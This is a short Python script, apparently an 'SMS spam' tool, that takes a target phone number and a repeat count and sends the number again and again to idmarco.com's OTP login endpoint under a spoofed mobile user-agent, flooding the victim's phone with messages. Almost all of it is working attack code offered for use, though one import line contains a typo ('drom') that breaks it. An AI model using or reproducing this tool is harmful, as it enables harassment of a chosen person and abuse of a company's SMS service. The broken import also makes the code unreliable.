import os,sys,time,re,requests
from requests import post
drom time import sleep
def marco():
    ua={
    "Host": "www.idmarco.com",
    "accept": "*/*",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    }
    d={"phone":no}
    r = requests.post("https://www.idmarco.com/smsotp/login/sendotp/", data=d, headers=ua)
    print (r.text)
os.system("clear")
print ("""\t\033[1;97mSPAM SMS IDMARCO
\033[1;97mCreator:\033[1;96mFahmiApz
\033[1;97mYoutube:\033[1;96mKnifer12
\033[90m-------------------------------""")
no = input("\033[1;97mNo Target: \033[1;92m")
jl = int(input("\033[1;97mLooping: \033[1;92m"))
for i in range(jl):
    sleep(1)
    marco()
    sleep(3)
